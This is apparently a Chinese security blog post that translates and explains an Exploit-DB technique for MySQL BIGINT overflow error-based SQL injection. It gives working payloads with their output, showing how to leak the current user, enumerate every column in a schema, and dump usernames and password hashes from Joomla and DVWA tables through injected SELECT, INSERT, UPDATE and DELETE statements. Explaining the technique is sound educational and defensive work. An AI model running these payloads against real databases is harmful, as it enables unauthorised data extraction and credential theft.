---
layout: post
title: BIGINT Overflow Error Based SQL Injection
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - Tr3jer_CongRong</p>

>根据Mysql BIGINT数据类型，结合Mysql两个小特性，巧妙的构造出新型报错注入。Paper翻译自<a target="_blank" href="https://www.exploit-db.com/docs/37733.pdf">BIGINT Overflow Error Based SQL Injection</a>，这里就分析下此报错注入的方式与原理。

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**首先看看Mysql(>=5.5.5)如何存储整数的，之前的版本当整数溢出的时候不会报错。<a target="_blank" href="http://dev.mysql.com/doc/refman/5.5/en/integer-types.html">Integer Types (Exact Value)</a>**

<img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/i76ryjtgdh.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**BIGINT数据类型的长度为8字节(64Bytes)，分别用二进制、十进制、十六进制的`signed/unsigned`表示最大值:**

	#signed - Binary、Decimal、Hex
	0b0111111111111111111111111111111111111111111111111111111111111111
	9223372036854775807
	0x7fffffffffffffff

	#unsigned - Binary、Decimal、Hex
	0b1111111111111111111111111111111111111111111111111111111111111111
	18446744073709551615
	0xFFFFFFFFFFFFFFFF

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**分别将`signed/unsigned`的BIGINT最大值进行数学计算，来证明报错的原因：**

	#signed
	mysql> select cast(x'7fffffffffffffff' as signed)/9223372036854775807;
	+---------------------------------------------------------+
	| cast(x'7fffffffffffffff' as signed)/9223372036854775807 |
	+---------------------------------------------------------+
	|                                                  1.0000 |
	+---------------------------------------------------------+
	1 row in set (0.00 sec)
	mysql> select cast(x'7fffffffffffffff' as signed)+1;
	ERROR 1690 (22003): BIGINT value is out of range in '(cast(0x7fffffffffffffff as signed) + 1)'
	
	#unsigned
	mysql> select 18446744073709551615-1;
	+------------------------+
	| 18446744073709551615-1 |
	+------------------------+
	|   18446744073709551614 |
	+------------------------+
	1 row in set (0.00 sec)
	mysql> select 18446744073709551615+1;
	ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**由此看出当BIGINT最大值进行增值运算的时候，`signed/unsigned`都会爆出`BIGINT value is out of range`的错误，也就是溢出了。还有就是Mysql逐位取反的特性，打个比方：**

	mysql> select ~0;
	+----------------------+
	| ~0                   |
	+----------------------+
	| 18446744073709551615 |
	+----------------------+
	1 row in set (0.00 sec)
	mysql> select ~18446744073709551615;
	+-----------------------+
	| ~18446744073709551615 |
	+-----------------------+
	|                     0 |
	+-----------------------+
	1 row in set (0.00 sec)
	
	mysql> select 1-~0;
	ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 - ~(0))'
	
	mysql> select 1+~0;
	ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**也就是说从0逐位取反，得到的数字也正是BIGINT中unsigned的数值范围，这个数值进行数学运算时同样会出现溢出错误。那么怎样能在实际应用当中利用上这个报错呢？接下来就说到了Mysql子查询的一个特性，当查询结果成功返回时，返回值为0，表达式进行逻辑非运算后，返回值则为1，并且这个返回值也可以进行数学运算：**

	mysql> select !(select*from(select user())x)+1;
	+----------------------------------+
	| !(select*from(select user())x)+1 |
	+----------------------------------+
	|                                2 |
	+----------------------------------+
	1 row in set (0.00 sec)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**根据子查询的特点，再结合BIGINT逐位取反的溢出报错。我们就可以进行报错注入了：**

	mysql> select !(select*from(select user())x)-~18446744073709551615;
	+------------------------------------------------------+
	| !(select*from(select user())x)-~18446744073709551615 |
	+------------------------------------------------------+
	|                                                    1 |
	+------------------------------------------------------+
	1 row in set (0.00 sec)
	
	mysql> select !(select*from(select user())x)-~0;
	ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'
	
	mysql> select (select(!x-~0)from(select(select user())x)a);
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
    
    mysql> select (select!x-~0.from(select(select user())x)a);
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**既然可以通过BIGINT溢出配合子查询进行报错注入，那么就可以在实战当中获取到更多的数据：**

	mysql> select !(select*from(select concat_ws(':',id, username, password) from k8fzi_users limit 0,1)x)-~0;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '533:admin:$2y$10$wE6S6EEj5Xc3/Jo8rQDSAu0mxQr2FmZJmT4SlsXL8PdM8Ymb/82Ly' from dual))) - ~(0))'

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**因为是BIGINT数值范围溢出特点，那么Mysql中很多数学函数也可以应用到，Mysql的语法灵活，这些数学函数是可以嵌套表达式的，然后将返回值进行运算。**

    select !hex((select*from(select user())x))-~0;
    select !ceil((select*from(select user())x))-~0;
    select !atan((select*from(select user())x))-~0;
    select !rand((select*from(select user())a))-~0;
    select !sqrt((select*from(select user())a))-~0;
    select !round((select*from(select user())a))-~0;
    select !sign((select*from(select user())a))-~0;
    select !floor((select*from(select user())a))-~0;
    select !tan((select*from(select user())a))-~0;
    select !ceiling((select*from(select user())a))-~0;
    select !exp((select*from(select user())x))-~0;
    select !(select*from(select user())a)-~1^200;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**既然是报错类型的注入，那么一次性存储也是可以的：**

    mysql> select !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x2d2d,table_name,0x2d2d,column_name)),@)))x)-~0;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
    joomla_3.4.4--k8fzi_assets--id
    joomla_3.4.4--k8fzi_assets--parent_id
    joomla_3.4.4--k8fzi_assets--lft
    joomla_3.4.4--k8fzi_assets--rgt
    joomla_3.4.4--k8fzi_assets--level
    joomla_3.4.4--k8fzi_assets--name
    joomla_3.4.4--k8fzi_assets--title
    joomla_3.4.4--k8fzi_assets--rules
    joomla_3.4.4--k8fzi_associations--id
    joomla_3.4.4--k8fzi_associations--context
    joomla_3.4.4--k8fzi_associations--key
    joomla_3.4.4--k8fzi_banner_clients--id
    joomla_3.4.4--k8fzi_banner

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**这里纠正一个Paper中错误的观点，文中提到一次性存储表列数据只能取出27行，其实这是报错信息的最大长度所决定的，如果只想取到重要信息的话，Payload中不加库名表名还有分隔符简短点就可以了，一图胜千言。**

<img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/5u6ehrtsdf.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**当知道库名表名列名后，就可以构造语句获取数据了：**

    #select:
    mysql> select !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
    1--admin--5f4dcc3b5aa765d61d8327deb882cf99
    2--gordonb--e99a18c428cb38d5f260853678922e03
    3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
    4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
    5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
    
    #insert:
    mysql> insert into users (user_id,user,password) values (2,'' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0 or '', 'Eyre');
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
    1--admin--5f4dcc3b5aa765d61d8327deb882cf99
    2--gordonb--e99a18c428cb38d5f260853678922e03
    3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
    4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
    5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
    
    #update:
    mysql> update users set password='root' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
    1--admin--5f4dcc3b5aa765d61d8327deb882cf99
    2--gordonb--e99a18c428cb38d5f260853678922e03
    3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
    4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
    5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
    
    #delete:
    mysql> delete from users where user_id='1' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
    1--admin--5f4dcc3b5aa765d61d8327deb882cf99
    2--gordonb--e99a18c428cb38d5f260853678922e03
    3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
    4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
    5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'